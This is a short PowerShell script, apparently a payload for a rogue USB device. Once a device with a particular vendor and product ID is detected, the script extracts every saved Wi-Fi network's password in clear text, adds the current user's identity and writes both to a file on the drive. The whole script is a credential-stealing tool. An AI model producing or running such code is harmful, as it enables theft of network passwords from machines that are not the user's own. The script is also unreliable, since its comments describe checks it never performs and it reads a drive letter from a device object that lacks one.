# The command Get-WmiObject queries DriveType = 2, which represents removable storage. 
# Replace "USB_LABEL" with the actual label of your USB drive.
# Once the USB drive is detected, the script uses test.txt as output file.

$usbDrive = Get-WmiObject -Query 'SELECT * FROM Win32_PnPEntity WHERE DeviceID LIKE "USB\\VID_16D0&PID_0753%"'

if ($usbDrive) {
    $filePath = "$($usbDrive.DriveLetter)\test.txt"
    $wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ":\s*")[1].Trim() }
    $output = ""

    $wifiProfiles | ForEach-Object {
        $profile = $_
        $profileInfo = netsh wlan show profile name="$profile" key=clear
        $passwordMatch = $profileInfo | Select-String "Key Content\s*:\s*(.*)" | ForEach-Object { $_.Matches[0].Groups[1].Value }
        $password = if ($passwordMatch) { $passwordMatch } else { "N/A" }
        $output += "Profile: $profile`nPassword: $password`n`n"
    }

    $userInfo = whoami
    $output += "`nUser Info: $userInfo`n"

    $output | Out-File -FilePath $filePath -Encoding utf8
}
